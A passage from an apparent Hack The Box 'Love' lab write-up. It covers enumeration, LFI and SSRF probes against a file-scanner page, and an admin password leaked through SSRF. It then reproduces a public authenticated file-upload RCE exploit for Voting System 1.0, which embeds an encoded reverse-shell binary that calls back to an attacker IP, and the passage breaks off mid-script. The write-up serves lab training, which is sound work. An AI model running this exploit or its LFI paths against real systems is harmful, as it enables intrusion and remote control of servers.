</span></span><span style="display:flex;"><span>/con                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/con.php              <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/con.html             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/con.jpg              <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                          
</span></span><span style="display:flex;"><span>/con.txt              <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>    
</span></span></code></pre></div><p>/admin/includes/ directory contains some php files, gone through them but they didn&rsquo;t seemed to be useful. If nothing worked out we can still give it a try.</p>
<p><img src="/assets/Pasted%20image%2020220415025857.png" alt="assets/Pasted image 20220415025857.png"></p>
<p>So let&rsquo;s move to next Port 443 and 5000.</p>
<h3 id="port-5000---http--apache-httpd-2446">PORT 5000 - HTTP  (Apache httpd 2.4.46)</h3>
<p>Trying to request the url , but seems like we are not allowed to access the website resources, Tried with hostname and IP as well.
May be possibly the Website contains something sensitive related to that Voting System.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://staging.love.htb:5000/
</span></span><span style="display:flex;"><span>http://10.10.10.239:5000/
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415030333.png" alt="assets/Pasted image 20220415030333.png"></p>
<p><img src="/assets/Pasted%20image%2020220415030402.png" alt="assets/Pasted image 20220415030402.png"></p>
<p>Let&rsquo;s move to the port 443 and continue our recon process.</p>
<h3 id="port-443----https--apache-httpd-2446">Port 443 -  HTTPS  (Apache httpd 2.4.46)</h3>
<p>From the nmap ssl-cert script we found a hostname and we have already added the hostname to our system /etc/hosts file. If not let&rsquo;s add it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.10.239 staging.love.htb love.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Going through the website figured out that we are not allowed to access the resources at this port as well.</p>
<p><img src="/assets/Pasted%20image%2020220415042123.png" alt="assets/Pasted image 20220415042123.png"></p>
<p>After few failed attempts , i figured out that we can access the hostname using http.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://staging.love.htb
</span></span></code></pre></div><p>Found a Free File Scanner Service Running and has a sign up page and a demo page as well.
<img src="/assets/Pasted%20image%2020220415042500.png" alt="assets/Pasted image 20220415042500.png">
Tried to create a sign up account , but that didn&rsquo;t seems to be functioning right now as its already mentioned &ldquo;We are not live yet please subscribe to get updates&rdquo;.</p>
<p>Demo page seems to be interesting its asking for file urls to scan the files.
Let&rsquo;s try to figure out if this is vulnerable to anything like Local File Inclusion , Server Side Request Forgery, File Upload Vulnerabilities or anything similar.</p>
<p><img src="/assets/Pasted%20image%2020220415043242.png" alt="assets/Pasted image 20220415043242.png"></p>
<p>Vulnerable to LFI</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file://windows/System32/drivers/etc/hosts
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415045445.png" alt="assets/Pasted image 20220415045445.png"></p>
<p>Vulnerable to SSRF</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://127.0.0.1
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415050221.png" alt="assets/Pasted image 20220415050221.png"></p>
<p>Now we can try to either get LFI to RCE by some possible ways like Log Poisioning or we can take advantage of SSRF to read the content hosted on port 5000.</p>
<p>Trying to get an RCE by poisioning logs ??
Figured out some possible windows logs files , Which we can poison and get the rce.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file://c:/windows/debug/netsetup.log
</span></span><span style="display:flex;"><span>file://c:/xampp/apache/logs/access.log
</span></span><span style="display:flex;"><span>file://c:/xampp/apache/conf/httpd.conf
</span></span><span style="display:flex;"><span>file://c:/xampp/apache/logs/error.log
</span></span></code></pre></div><p>I found no possible ways to poison any of these available logs file.
So i moved to SSRF and used it to find the hidden service running at port 5000, Which actually leaked the Admin Account Credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://127.0.0.1:5000/
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415090725.png" alt="assets/Pasted image 20220415090725.png"></p>
<p>We got the credentials for Voting Admin Panel , Which we found earlier on Port 80.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.10.10.239/admin
</span></span></code></pre></div><p>Let&rsquo;s try to login with these credentials.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>admin:@LoveIsInTheAir!!!!
</span></span></code></pre></div><p><img src="/assets/Pasted%20image%2020220415091543.png" alt="assets/Pasted image 20220415091543.png"></p>
<p>From the Dashboard we can figure out that the voting application system is possibly open sourced, So we can look for codes and try to figure out the possible ways to get the RCE.
Or we can search if its vulnerable to anything similar which can lead us to RCE.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>searchsploit voting system Remote code Execution
</span></span></code></pre></div><p>Found multiple Remote Code Execution (Authenticated) , Let&rsquo;s try to use these exploit and see if we get them work.</p>
<p><img src="/assets/Pasted%20image%2020220417014914.png" alt="assets/Pasted image 20220417014914.png"></p>
<p>Get Both of these exploits,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>searchsploit -m 49445.py <span style="color:#f92672">&amp;&amp;</span> searchsploit -m 50076.txt
</span></span></code></pre></div><p>Let&rsquo;s use these exploit to gain access to the target machine.</p>
<p>We can also enumerate other ports to get more possible ways to gain access to the target machine. But let&rsquo;s just use the current Exploits we found.</p>
<hr>
<h1 id="exploitation">Exploitation</h1>
<h4 id="using-exploit-to-gain-access">Using Exploit To gain access</h4>
<p>Let&rsquo;s try to use the python exploit as it will get us the shell quickly, Also we have to make some modifications in the exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 19/01/2021</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: Richard Jones</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://www.sourcecodester.com/download-code?nid=12306&amp;title=Voting+System+using+PHP%2FMySQLi+with+Source+Code</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: 1.0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Windows 10 2004 + XAMPP 7.4.4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- Edit your settings here ----</span>
</span></span><span style="display:flex;"><span>IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.10.239&#34;</span> <span style="color:#75715e"># Website&#39;s URL</span>
</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#75715e">#Auth username</span>
</span></span><span style="display:flex;"><span>PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@LoveIsInTheAir!!!!&#34;</span> <span style="color:#75715e"># Auth Password</span>
</span></span><span style="display:flex;"><span>REV_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.14.12&#34;</span> <span style="color:#75715e"># Reverse shell IP</span>
</span></span><span style="display:flex;"><span>REV_PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;9000&#34;</span> <span style="color:#75715e"># Reverse port</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INDEX_PAGE <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/index.php&#34;</span>
</span></span><span style="display:flex;"><span>LOGIN_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/login.php&#34;</span>
</span></span><span style="display:flex;"><span>VOTE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/admin/voters_add.php&#34;</span>
</span></span><span style="display:flex;"><span>CALL_SHELL <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>IP<span style="color:#e6db74">}</span><span style="color:#e6db74">/images/shell.php&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">header(&#39;Content-type: text/plain&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ip   = &#34;IIPP&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$port = &#34;PPOORRTT&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$payload = &#34;7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWqcx0VqLK+4XIBw7vhEr9VooKylIoMpVAGpQnlcgUMpYohpVoOSeRQSHQcJFOIxB42NiT22xoxoQDAw+CAH1KaY/9dtw+g4cgYrAMAoQEd1ZPopwG1lai2v13dDI59s27M2/W/TX4zhwru9Qi9jem/4fTfbwKt54cB/mPZagIA5n+QlxCT5PnaOfm7BWH/cn37UJ7Xv7fxev+z/srjvOF5/7a59rccu7/wTD4enitmvtzFxhprXWZ0rHvn3Z0jVw8CQCEVZbgBwCIACBhqQ5A47ZBfeQSHAxSZYNa1EDYRIIDY6p7xKZBNRdrZFDKdsWhgWF7TTaW3gQTrZJAUYHCfCBjvctfh6OWAJ2clIOCA+My6kdq5XGeKqxuRW9f10cvkcqZAGaR32rvd+nNwlW5jf6ZCH0zX+c8X2V52wbV4xoBS/a2R+nP2XDqFfFHbPzabyoKHbB406JcRj/qVH/afPHd5GLfBPH+njrX2ngFeBChqqmU0N72r53JM4H57U07gevzjnkADXhlVj5kNEHeokIzlhdpJDK3wuc0tWtFJwiNpzWUvk7bJbXOjmyE7+CAcGXj4Vq/iFd4x8IC613I+0IoWFOh0qxjnLUgAYYnLcL3N+W/tCi8ggKXCq2vwNK6+8ilmiaHKSPZXdKrq1+0tVHkyV/tH1O2/FHtxVgHmccSpoZa5ZCO9O3V3P6aoKyn/n69K535eDrNc9UQfmDw6aqiuNFx0xctZ+zBD7SOT9oXWA5kvfUqcLxkjF2Ejy49W7jc/skP6dOM0oxFIfzI6qbehMItaYb8E3U/NzAtnH7cCnO7YlAUmKuOWukuwvn8B0cHa1a9nZJS8oNVsvJBkGTRyt5jjDJM5OVU87zRk+zQjcUPcewVDSbhr9dcG+q+rDd+1fVYJ1NEnHYcKkQnd7WdfGYoga/C6RF7vlEEEvdTgT6uwxAQM5c4xxk07Ap3yrfUBLREvDzdPdI0k39eF1nzQD+SR6BSxed1mCWHCRWByfej33WjX3vQFj66FVibo8bb1TkNmf0NoE/tguksTNnlYPLsfsANbaDUBNTmndixgsCKb9QmV4f2667Z1n8QbEprwIIfIpoh/HnqXyfJy/+SnobFax1wSy8tXWV30MTG1UlLVKPbBBUz29QEB33o2tiVytuBmpZzsp+JEW7yre76w1XOIxA4WcURWIQwOuRd0D1D3s1zYxr6yqp8beopn30tPIdEut1sTj+5gdlNSGHFs/cKD6fTGo1WV5MeBOdV5/xCHpy+WFvLO5ZX5saMyZrnN9mUzKht+IsbT54QYF7mX1j7rfnnJZkjm72BJuUb3LCKyMJiRh23fktIpRF2RHWmszSWNyGSlQ1HKwc9jW6ZX3xa693c8b1UvcpAvV84NanvJPmb9ws+1HrrKAphe9MaUCDyGUPxx+osUevG0W3D6vhun9AX2DJD+nXlua7tLnFX197wDTIqn/wcX/4nEG8RjGzen8LcYhNP3kYXtkBa28TMS2ga0FO+WoY7uMdRA9/r7drdA2udNc7d6U7C39NtH7QvGR1ecwsH0Cxi7JlYjhf3A3J76iz5+4dm9fUxwqLOKdtF1jW0Nj7ehsiLQ7f6P/CE+NgkmXbOieExi4Vkjm6Q7KEF+dpyRNQ12mktNSI9zwYjVlVfYovFdj2P14DHhZf0I7TB22IxZ+Uw95Lt+xWmPzW7zThCb2prMRywnBz4a5o+bplyAo0eTdI3vOtY0TY1DQMwx0jGv9r+T53zhnjqii4yjffa3TyjbRJaGHup48xmC1obViCFrVu/uWY2daHTSAFQQwLww7g8mYukFP063rq4AofErizmanyC1R8+UzLldkxmIz3bKsynaVbJz6E7ufD8OTCoI2fzMXOa67BZFA1iajQDmTnt50cverieja4yEOWV3R32THM9+1EDfyNElsyN5gVfa8xzm0CsKE/Wjg3hPR/A0WDUQ1CP2oiVzebW7RuG6FPYZzzUw+7wFMdg/0O1kx+tu6aTspFkMu0u3Py1OrdvsRwXVS3qIAQ/nE919fPTv6TusHqoD9P56vxfJ5uyaD8hLl1HbDxocoXjsRxCfouJkibeYUlQMOn+TP62rI6P6kHIewXmbxtl59BxMbt6Hn7c7NL7r0LfiF/FfkTFP1z7UF9gOjYqOP694ReKlG8uhCILZ4cLk2Louy9ylYDaB5GSpk03l7upb584gR0DH2adCBgMvutH29dq9626VPPCPGpciG6fpLvUOP4Cb6UC9VA9yA9fU1i+m5Vdd6SaOFYVjblJqhq/1FkzZ0bTaS9VxV1UmstZ8s3b8V7qhmOa+3Klw39p5h/cP/woRx4hVQfHLQV7ijTbFfRqy0T0jSeWhjwNrQeRDY9fqtJiPcbZ5xED4xAdnMnHep5cq7+h79RkGq7v6q+5Hztve262b260+c9h61a6Jpb+ElkPVa9Mnax7k4Qu+Hzk/tU+ALP6+Frut4L8wvwqXOIaVMZmDCsrKJwU91e/13gGfet8EPgZ8eoaeLvXH+JpXLR8vuALdasb5sXZVPKZ7Qv+8X0qYKPCNLid6Xn7s92DbPufW/GMMQ4ylT3YhU2RP3jZoIWsTJJQvLzOb4KmixmIXZAohtsI0xO4Ybd9QtpMFc0r9i+SkE/biRFTNo+XMzeaXFmx0MEZvV+T2DvOL4iVjg0hnqSF5DVuA58eyHQvO+yIH82Op3dkiTwGDvTOClHbC54L6/aVn9bhshq5Zntv6gbVv5YFxmGjU+bLlJv9Ht/Wbidvvhwa4DwswuF155mXl7pcsF8z2VUyv8Qa7QKpuTN//d9xDa73tLPNsyuCD449KMy4uvAOH80+H+nds0OGSlF+0yc4pyit0X80iynZmCc7YbKELGsKlRFreHr5RYkdi1u0hBDWHIM7eLlj7O/A8PXZlh5phiVzhtpMYTVzZ+f0sfdCTpO/riIG/POPpI3qonVcE636lNy2w/EBnz7Os+ry23dIVLWyxzf8pRDkrdsvZ7HMeDl9LthIXqftePPJpi25lABtDHg1VWK5Gu7vOW9fBDzRFw2WWAMuBo6Xbxym8Fsf9l0SV3AZC7kGCxsjFz95ZcgEdRSerKtHRePpiaQVquF8KOOiI58XEz3BCfD1nOFnSrTOcAFFE8sysXxJ05HiqTNSd5W57YvBJU+vSqKStAMKxP+gLmOaOafL3FLpwKjGAuGgDsmYPSSpJzUjbttTLx0MkvfwCQaQAf102P1acIVHBYmWwVKhSiVWpPit8M6GfEQRRbRVLpZA/lKaQy8VpsFhEIgHB0VFxMaHB6CxiYnKAKIk8I2fmNAtLZGIoXSiRqpVifxIAQRskNQ6bXylhtVD6njqPGYhXKL/rqrkOLUzNW6eChDBWJFo63lv7zXbbrPU+CfJMuSJHDmUVjshrxtUixYYPFGmLJAqGUgHXX5J1kRV7s9er6GEeJJ/5NdluqRLhkvfFhs+whf0Qzspoa7d/4ysE834sgNlJxMylgGAJxi3f8fkWWd9lBKEAXCpRiw2mgjLVBCeV6mvFowZg7+E17kdu5iyJaDKlSevypzyxoSRrrpkKhpHpC6T0xs6p6hr7rHmQrSbDdlnSXcpBN8IR2/AkTtmX7BqWzDgMlV6LC04oOjVYNw5GkAUg1c85oOWTkeHOYuDrYixI0eIWiyhhGxtT6sznm4PJmTa7bQqkvbn8lt044Oxj890l3VtssRWUIGuBliVcQf8yrb1NgGMu2Ts7m1+pyXliaZ9LxRQtm2YQBCFaq43F+t24sKJPh3dN9lDjGTDp6rVms5OEGkPDxnZSs0vwmZaTrWvuOdW/HJZuiNaCxbjdTU9IvkHkjVRv4xE7znX3qLvvTq+n0pMLIEffpLXVV/wE5yHZO9wEuojBm3BeUBicsdBXS/HLFdxyv5694BRrrVVM8LYbH7rvDb7D3V1tE3Z31dG9S9YGhPlf71g+/h6peY/K573Q0EjfHutRkrnZdrPR/Nx4c/6NgpjgXPn+1AM3lPabaJuLtO717TkhbaVJpCLp8vFPQyE+OdkdwGws2WN78WNC/ADMUS/EtRyKKUmvPSrFTW8nKVllpyRlvrxNcGGpDHW/utgxRlWpM47cXIbzWK0KjyeI7vpG3cXBHx48fioKdSsvNt180JeNugNPp/G9dHiw7Mp6FuEdP1wYWuhUTFJ6libBKCsrMZbB142LSypxWdAyEdoHZLmsqrQC3GieGkZHQBZOFhLxmeacNRRfn8UEEw6BSDv3/svZRg7AwtklaCK5QBKOUrB3DzG/k8Ut9RRigqUKlRh83jsdIZSLpGKlWAiLY5SKNOT6cPV+Li1EbA+LJbAkTSiNE6dV9/A4cQ6hcjulfbVVZmIu3Z8SvqJHrqhZmC2hymXipRuE7sLUjurA6kgukydUsZRzlDbPb3z4MkohUksLnEO4yPiQlX1EHLwaVmetlacrDvUkqyB8Trbk/U/GZeIu3qVseyKcIN/K//lV9XLR58ezHMIkUjMLq1wxES9VCU9I1a9ivB/eOJMPB9CqZDWODTaJwqSwqjjyyDdWw2ujU7fND/+iq/qlby6fnxEumy//OkMb1dGgomZhxRib9B07XlTLBsVuKr4wiwHnZdFqb8z+Yb8f4VCq1ZK2R6c9qAs9/eAfRmYn00uZBIXESp6YMtAnXQhg0uen5zzvTe7PIcjEsrSsvNUElSRD3unww3WhNDs9CypOP1sp7Rr/W1NiHDeOk7mQa1cfVG5zpy246x2pU531eShXlba8dkLYsCNVIhd5qwJmJTukgw4dGVsV2Z2b6lPztu86tVUuxePD25Uq6SZi/srizBWcgzGhPAwR7Z/5GkFLc2z7TOdM9if/6ADM0mFNQ9IQPpl+2JO8ec78bsd7GDAgT36LepLCyVqCAyCC8s4KkM6lZ3Xi13kctDIuZ+JalYDn9jaPD2UllObdJQzj4yLyVC+4QOAk8BANRN5eIRWen8JWOAwNyVyYJg+l2yTdEN3a6crkeIi3FnRAPUXKspM4Vcwc15YJHi5VrTULwkp3OmpyJMFZo5iKwRP4ecGx8X40QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$evalCode = gzinflate(base64_decode($payload));
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$evalArguments = &#34; &#34;.$port.&#34; &#34;.$ip;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$tmpdir =&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">chdir($tmpdir);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$res .= &#34;Using dir : &#34;.$tmpdir;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$filename = &#34;D3fa1t_shell.exe&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$file = fopen($filename, &#39;wb&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fwrite($file, $evalCode);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fclose($file);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$path = $filename;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$cmd = $path.$evalArguments;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$res .= &#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Executing : &#34;.$cmd.&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">echo $res;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$output = system($cmd);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;IIPP&#34;</span>, REV_IP)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;PPOORRTT&#34;</span>, REV_PORT)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getCookies</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(INDEX_PAGE)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>cookies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>    cookies <span style="color:#f92672">=</span> getCookies()
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>:USERNAME,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>:PASSWORD,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;login&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(LOGIN_URL, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookies)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Logged in&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendPayload</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> login():
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> payload
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> bytes(payload, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>)
</span></span><span style="display:flex;"><span>        files  <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;photo&#39;</span>:(<span style="color:#e6db74">&#39;shell.php&#39;</span>,payload,
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;image/png&#39;</span>, {<span style="color:#e6db74">&#39;Content-Disposition&#39;</span>: <span style="color:#e6db74">&#39;form-data&#39;</span>}
</span></span><span style="display:flex;"><span>                  )
</span></span><span style="display:flex;"><span>              }
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;firstname&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;lastname&#34;</span>:<span style="color:#e6db74">&#34;b&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;add&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(VOTE_URL, data<span style="color:#f92672">=</span>data, files<span style="color:#f92672">=</span>files)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Poc sent successfully&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Error&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">callShell</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(CALL_SHELL, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
